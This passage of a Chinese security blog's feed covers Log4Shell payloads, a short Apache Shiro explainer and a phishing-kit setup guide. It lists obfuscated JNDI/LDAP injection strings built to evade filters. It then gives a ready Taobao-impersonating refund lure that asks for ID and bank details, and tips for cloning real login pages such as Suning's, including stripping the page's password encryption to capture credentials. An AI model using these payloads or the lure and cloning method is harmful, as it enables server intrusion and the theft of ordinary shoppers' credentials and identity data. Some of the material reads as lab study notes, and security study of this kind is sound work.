&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        ######垃圾字符
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;asd是zxc12${jndi:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        ######前缀大小写绕过
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${jNdi:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        ###### :- 赋值分隔符绕过。如果程序处理到 `${aaaa:-bbbb}` 这样的字符串，处理的结果将会是 `bbbb`，`:-` 关键字将会被截取掉，而之前的字符串都会被舍弃掉。
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${123asd:-j}ndi:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${123asd:-j}n${zxcasd:-d}i:ldap://127.0.0.1:23457/Command8}&amp;#34;; //支持嵌套
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${t:-j}${a:-N}${t:-d}i:${h:-ldap}://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        ###### :\\- 复制分隔符绕过 如果一个用 `a:b` 表示的键值对的 key `a` 中包含 `:`，则需要使用转义来配合处理，例如 `${aaa:\\-bbb:-ccc}`，代表 key 是，`aaa:bbb`，value 是 `ccc`
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${123a:\\-sd:-j}ndi:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${123a:\\-sd:-j}n${asda:\\-sd:-d}i:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${t:\\-s:-j}${a:-N}${t:\\-c:-d}i:${h:-ldap}://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        ######编码绕过
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${jnd${upper:\u0131}:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${${s:-j}${a:\\-s:-N}${t:-d}${upper:\u0131}:${h:-ldap}://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        小嵌套
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${env:JAVA_HOME}${jndi:ldap://127.0.0.1:23457/Command8}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;//            logger.error(&amp;quot;${sasd:hostname}&amp;quot;);
//            logger.error(&amp;quot;${date:dd/MM/yyyy}&amp;quot;);
//            logger.error(&amp;quot;${java:version}&amp;quot;);
//            logger.error(&amp;quot;${maker:1}&amp;quot;);
//            logger.error(&amp;quot;${ctx:2}&amp;quot;);
//            logger.error(&amp;quot;${main:3}&amp;quot;);
//            logger.error(&amp;quot;${jvmrunargs:4}&amp;quot;);
//            logger.error(&amp;quot;${sys:os.name}&amp;quot;);
//            logger.error(&amp;quot;${env:JAVA_HOME}&amp;quot;);
//            logger.error(&amp;quot;${log4j:configParentLocation}&amp;quot;);
//            strLookupMap.put(&amp;quot;lower&amp;quot;, new LowerLookup());
//            strLookupMap.put(&amp;quot;upper&amp;quot;, new UpperLookup());
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;检测&#34;&gt;检测&lt;/h2&gt;
&lt;p&gt;标头&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Referer
TE
True-Client-IP
True-Client-Ip
Upgrade
User-Agent
Via
Warning
X-ATT-DeviceId
X-Api-Version
X-Att-Deviceid
X-CSRFToken
X-Client-Ip
X-Correlation-ID
X-Csrf-Token
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forward-For
X-Forward-Proto
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Frame-Options
X-From
X-Geoip-Country
X-HTTP-Method-Override
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Originating-Ip
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Request-ID
X-Requested-With
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;burp插件：https://github.com/tangxiaofeng7/BurpLog4j2Scan
yakit插件：Log4Shell 漏洞检测（自动检测版）&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://tttang.com/archive/1378/#toc_0x00&#34;&gt;https://tttang.com/archive/1378/#toc_0x00&lt;/a&gt;
&lt;a href=&#34;https://www.cnpanda.net/sec/1114.html&#34;&gt;https://www.cnpanda.net/sec/1114.html&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/log4j2/" term="log4j2" label="log4j2" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">cc链分析</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/cc/" />
            <id>https://klearcc.github.io/post/cc/</id>
            <updated>2022-12-14T21:03:17&#43;08:00</updated>
            <published>2022-12-03T15:14:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">bilibili 白日梦组长 没学懂</summary>
            
                <content type="html">&lt;h2 id=&#34;bilibili&#34;&gt;bilibili&lt;/h2&gt;
&lt;p&gt;白日梦组长&lt;/p&gt;
&lt;p&gt;没学懂&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">shiro-550漏洞分析</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_shiro/" />
            <id>https://klearcc.github.io/post/javasec_shiro/</id>
            <updated>2023-01-10T13:58:10&#43;08:00</updated>
            <published>2022-11-23T21:14:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">shiro关键组件 SecurityManager org.apache.shiro.mgt.SecurityManager shiro核心接口……</summary>
            
                <content type="html">&lt;h2 id=&#34;shiro关键组件&#34;&gt;shiro关键组件&lt;/h2&gt;
&lt;h6 id=&#34;securitymanager&#34;&gt;SecurityManager&lt;/h6&gt;
&lt;p&gt;org.apache.shiro.mgt.SecurityManager 	shiro核心接口，负责一个Subject全部安全操作&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;接口本身定义了login、logout、createSubject三个方法控制用户创建登录和退出&lt;/p&gt;
&lt;p&gt;扩展了org.apache.shiro.authc.Authenticator。该接口提供了authenticate方法用来认证&lt;/p&gt;
&lt;p&gt;扩展了org.apache.shiro.authz.Authorizer。该接口提供了对Permission和Role的校验方法&lt;/p&gt;
&lt;p&gt;扩展了org.apache.shiro.session.mgt。该接口提供了start、getSession方法来创建获取会话&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;shiro为SecurityManager提供了了一个包含上述功能的实现类DefaultSecurityManager&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;subjectFactory：默认使用DefaultSubjectFactory，用来创建具体Subject实现类&lt;/p&gt;
&lt;p&gt;subjectDAO：默认使用DefaultSubjectDAO，用来将最近subject中信息保存到Session中&lt;/p&gt;
&lt;p&gt;rememberMeManager：提供记住我功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;DefaultSecurityManager有一个子类 DefaultWebSecurityManager，这个类在shiro-web包中。这个类默认创建配置了org.apache.shiro.web.mgt.CookieRememberManager，用来提供记住我相关功能。&lt;/p&gt;
&lt;h6 id=&#34;subject&#34;&gt;Subject&lt;/h6&gt;
&lt;p&gt;org.apache.shiro.subject.Subject是一个接口，表示Shiro中的一个用户&lt;/p&gt;
&lt;p&gt;Subject接口同样提供了认证、授权和获取回话的能力，在应用程序中要获取一个当前的Subject，使用SecurityUtils.getSubject()即可。&lt;/p&gt;
&lt;p&gt;只从功能上看似乎Subject和SecurityManager差不多，实际上Subject接口的实现类org.apache.shiro.subject.support.DelegatingSubject本质上就是一个SecurityManager的代理类。&lt;/p&gt;
&lt;p&gt;DelegatingSubject中保存了一个transient修饰的SecurityManager成员变量。使用具体校验方法时实际上交给SecurityManager处理。DelegatingSubject中不保存和维持用户的状态，每次依赖底层的SecurityManager来校验，因此一般SecurityManager的实现类都提供一些缓存机制。&lt;/p&gt;
&lt;h6 id=&#34;realm&#34;&gt;Realm&lt;/h6&gt;
&lt;p&gt;org.apache.shiro.realm.Realm是shiro中的一个接口，shiro通过Realm来访问指定应用的安全实体（用户 角色 权限等）。一个Realm通常与一个数据源有一对一的关系，比如关系型数据库、文件系统等。&lt;/p&gt;
&lt;p&gt;所以此接口的实现类将使用特定于数据源的API来进行认证或授权，比如JDBC、文件IO等。官方解释：特定于安全的DAO层。&lt;/p&gt;
&lt;p&gt;使用中研发通常不会直接实现Realm接口，而是实现 shiro提供了一些相关功能的 抽象类，如AuthenticatingRealm/AuthorizingRealm；或者使用针对特定数据源提供的实现类，如JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm等&lt;/p&gt;
&lt;h2 id=&#34;认证和授权校验流程&#34;&gt;认证和授权校验流程&lt;/h2&gt;
&lt;p&gt;通过上面组件的了解，总结流程&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;应用程序获取当前的Subject（用户），调用相应校验方法&lt;/p&gt;
&lt;p&gt;Subject将校验委托给SecurityManager进行判断&lt;/p&gt;
&lt;p&gt;SecurityManager调用Realm获取信息判断用户对应用户的角色能否操作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;shiro550&#34;&gt;Shiro550&lt;/h2&gt;
&lt;p&gt;影响版本：1.x &amp;lt; 1.2.5&lt;/p&gt;
&lt;p&gt;待续/&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/shiro/" term="shiro" label="shiro" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">钓鱼环境</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E9%92%93%E9%B1%BC/" />
            <id>https://klearcc.github.io/post/%E9%92%93%E9%B1%BC/</id>
            <updated>2022-11-23T21:13:50&#43;08:00</updated>
            <published>2022-11-03T19:25:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">任务：钓鱼邮件 1、搭建邮件服务器以及相关……</summary>
            
                <content type="html">&lt;h3 id=&#34;任务钓鱼邮件&#34;&gt;任务：钓鱼邮件&lt;/h3&gt;
&lt;p&gt;1、搭建邮件服务器以及相关钓鱼系统；
2、邮件内容仿真
3、邮箱不包括QQ 163等常见邮箱；
4、获取信息包括且不限于：用户名、密码&lt;/p&gt;
&lt;h3 id=&#34;gophish&#34;&gt;gophish&lt;/h3&gt;
&lt;p&gt;项目：https://github.com/gophish/gophish&lt;/p&gt;
&lt;h6 id=&#34;方式一&#34;&gt;方式一&lt;/h6&gt;
&lt;p&gt;服务器(需要vps服务商开25端口)
在release下载适合自己系统的包，解压运行gophish。直接当头一棒
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211012246823.png&#34; alt=&#34;image-20221101224009883&#34;&gt;
解决()：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-cd&#34; data-lang=&#34;cd&#34;&gt;wget https://mirror.bjtu.edu.cn/gnu/libc/glibc-2.28.tar.xz --no-check-certificate
tar -xf glibc-2.28.tar.xz
cd glibc-2.28/
mkdir build
cd build/
../configure --prefix=/usr/local/glibc-2.28
yum install gcc
../configure --prefix=/usr/local/glibc-2.28
yum -y install centos-release-scl
yum -y install devtoolset-8-gcc devtoolset-8-gcc-c++ devtoolset-8-binutils
scl enable devtoolset-8 bash
echo &amp;#34;source /opt/rh/devtoolset-8/enable&amp;#34; &amp;gt;&amp;gt;/etc/profile
wget http://ftp.gnu.org/gnu/make/make-4.2.tar.gz
tar -xzvf make-4.2.tar.gz
cd make-4.2
sudo ./configure
sudo make
sudo make install
sudo rm -rf /usr/bin/make
sudo cp ./make /usr/bin/
make -v
cd /usr/local/glibc-2.28/build/			##注意此目录
yum install -y bison
sudo ../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin
make  //make 运行时间较长
make install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;./gophish 	##安装
安装完后会输出登录信息
https://ip:3333 ##后台 默认密码见下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211012359961.png&#34; alt=&#34;image-20221101235949907&#34;&gt;&lt;/p&gt;
&lt;h6 id=&#34;方式2&#34;&gt;方式2&lt;/h6&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker pull gophish/gophish
docker run -itd -p 80:80 -p 3333:3333 -p 8080:8080 -p 8443:8443  gophish/gophish /bin/bash
docker exec -it 9e302e76f6c9 /bin/bash	##id换为自己容器id
./gophish
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问https://ip:3333&lt;/p&gt;
&lt;h3 id=&#34;ewomail&#34;&gt;ewomail&lt;/h3&gt;
&lt;p&gt;关闭seLinux&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi /etc/sysconfig/selinux
SELINUX=enforcing 改为 SELINUX=disabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检查swap&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;free -m 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果swap一行为0的话创建swap分区&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dd if=/dev/zero of=/mnt/swap bs=1M count=1024  ##大小可自己配置，如果服务器内存&amp;gt;2G则不用配置
mkswap /mnt/swap	##设置交换分区文件
swapon /mnt/swap	##启动swap
##设置开启自启动swap分区
##需要修改文件 /etc/fstab 中的 swap 行，添加
/mnt/swap swap swap defaults 0 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;##国外网络
yum -y install git
git clone https://github.com/gyxuehu/EwoMail.git
cd EwoMail/install
#需要输入一个邮箱域名，不需要前缀，列如下面的klear.cn，域名后面要加空格加en
sh start.sh klear.cn en
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装好后设置hosts&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi /etc/hosts
添加以下内容，xxx.com为自己域名
127.0.0.1 mail.xxx.com smtp.xxx.com imap.xxx.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装结束，访问面板&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://ip:7010/	##管理后台 密码：admin/ewomail123
https://ip:7000/	##邮件系统(需要vps服务商开25端口)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置域名解析
到域名管理后台按下图设置
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211020010727.png&#34; alt=&#34;image-20221102001004693&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取DKIM &amp;gt; 在邮件服务器执行 &lt;code&gt;amavisd -c /etc/amavisd/amavisd.conf showkeys&lt;/code&gt;
将获取到的内容复制到http://www.ewomail.com/list-20.html即可查看记录值
比如我在dynadot的域名设置
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211020013273.png&#34; alt=&#34;image-20221102001306242&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置完后可以使用域名访问后台了。&lt;/p&gt;
&lt;h3 id=&#34;发件&#34;&gt;发件&lt;/h3&gt;
&lt;p&gt;到此为止邮件服务器、gophish安装好了。
gofish使用可自己百度
其中有几个值得记录的&lt;/p&gt;
&lt;h5 id=&#34;邮件主题&#34;&gt;邮件主题&lt;/h5&gt;
&lt;p&gt;淘宝提醒您：退款失败&lt;/p&gt;
&lt;h5 id=&#34;邮件模板-可以直接在html编辑&#34;&gt;邮件模板 可以直接在html编辑&lt;/h5&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    亲爱的顾客您好!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;您的下列订单退款失败 &amp;lt;br&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp; 订单编号： 104525977637836993&amp;lt;br&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp; 退款金额：￥499.00&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;因您的退款账户无效，请您至变更退款数据页面更正您的银行账号，为确认您的身份，需先输入您本人的身份证件数据，且退款账户所有人需与身份认证为同一人！ &amp;lt;br&amp;gt;点此查看&amp;lt;a href=&amp;#34;{{.URL}}&amp;#34;&amp;gt;退款详情&amp;lt;/a&amp;gt;,谢谢您的配合！ &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;------------------------------------&amp;lt;br&amp;gt;※请勿直接回复此信，若有疑问请至网络留言版留言，我们将尽速为您服务。
{{.Tracker}}&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果&lt;/p&gt;
&lt;p&gt;![image-20221102172148405](/Users/baicai/Library/Application Support/typora-user-images/image-20221102173908395.png)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021740282.png&#34; alt=&#34;image-20221102174002216&#34;&gt;&lt;/p&gt;
&lt;p&gt;gmial&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021741671.png&#34; alt=&#34;image-20221102174127607&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021741869.png&#34; alt=&#34;image-20221102174148824&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;钓鱼页面&#34;&gt;钓鱼页面&lt;/h4&gt;
&lt;p&gt;import问题：摘自csdn..忘记哪位先辈了 抱歉，下次看到会贴出链接&lt;/p&gt;
&lt;p&gt;（必看）经验之谈 · 注意事项
在导入真实网站来作为钓鱼页面时，绝大多数情况下并非仅通过Import就能够达到理想下的克隆，通过多次实践，总结出以下几点注意事项&lt;/p&gt;
&lt;p&gt;【捕获不到提交的数据】导入后要在HTML编辑框的非Source模式下观察源码解析情况，如果明显发现存在许多地方未加载，则有可能导入的源码并非页面完全加载后的前端代码，而是一个半成品，需要通过浏览器二次解析，渲染未加载的DOM。这种情况下，除非能够直接爬取页面完全加载后的前端代码，否则无法利用gophish进行钓鱼，造成的原因是不满足第2点。&lt;/p&gt;
&lt;p&gt;【捕获不到提交的数据】导入的前端源码，必须存在严格存在&amp;lt;form method=&amp;quot;post&amp;quot; ···&amp;gt;&amp;lt;input name=&amp;quot;aaa&amp;quot; ··· /&amp;gt; ··· &amp;lt;input type=&amp;quot;submit&amp;quot; ··· /&amp;gt;&lt;/form&gt;结构，即表单（POST方式）— Input标签（具有name属性）Input标签（submit类型）— 表单闭合的结构，如果不满足则无法捕获到提交的数据&lt;/p&gt;
&lt;p&gt;【捕获不到提交的数据】在满足第2点的结构的情况下，还需要求&amp;lt;form method=&amp;quot;post&amp;quot; ···&amp;gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。否则将会把表单数据提交给action指定的页面，而导致无法被捕获到&lt;/p&gt;
&lt;p&gt;【捕获数据不齐全】对于需要被捕获的表单数据，除了input标签需要被包含在&lt;form&gt;中，还需满足该&lt;input&gt;存在name属性。例如&lt;input name=&#34;username&#34;&gt;,否则会因为没有字段名而导致value被忽略&lt;/p&gt;
&lt;p&gt;【密码被加密】针对https页面的import，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密
以上5点是在实践中总结出来的宝贵经验，或许还有其他许多坑未填，但所有的坑通常都围绕在&lt;form&gt;&lt;input /&gt;&lt;/form&gt;结构中，所以如果遇到新坑，先将该结构排查一遍，还是不行，再另辟蹊径&lt;/p&gt;
&lt;h3 id=&#34;例&#34;&gt;例&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://klearcc.github.io/post/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/&#34;&gt;苏宁易购&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211051242637.png&#34; alt=&#34;image-20221105124224570&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E9%92%93%E9%B1%BC/" term="钓鱼" label="钓鱼" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">gophish抓用户输入例子</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/" />
            <id>https://klearcc.github.io/post/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/</id>
            <updated>2022-11-15T11:32:44&#43;08:00</updated>
            <published>2022-11-03T19:24:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">例：苏宁易购 感谢恐是归来鹤妹妹的帮助~^……</summary>
            
                <content type="html">&lt;h3 id=&#34;例苏宁易购&#34;&gt;例：苏宁易购&lt;/h3&gt;
&lt;p&gt;感谢恐是归来鹤妹妹的帮助~^o^~&lt;/p&gt;
&lt;p&gt;源站：https://passport.suning.com/ids/login
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211022349528.png&#34; alt=&#34;image-20221102234938406&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;问题&#34;&gt;问题&lt;/h3&gt;
&lt;p&gt;gophish直接import之后不能读取到用户输入。因为源码为div内嵌input，而gophish只支持获取form表单内input标签下内容。&lt;/p&gt;
&lt;h3 id=&#34;思路&#34;&gt;思路&lt;/h3&gt;
&lt;p&gt;查看元素发现username-login控制表单的提交，其中包含熟悉的&lt;code&gt;&amp;lt;input id=xxx type=xxx&amp;gt;&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211030003516.png&#34; alt=&#34;&#34;&gt;
源码搜索”username-login“，定位到这里
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211022357104.png&#34; alt=&#34;image-20221102235741074&#34;&gt;
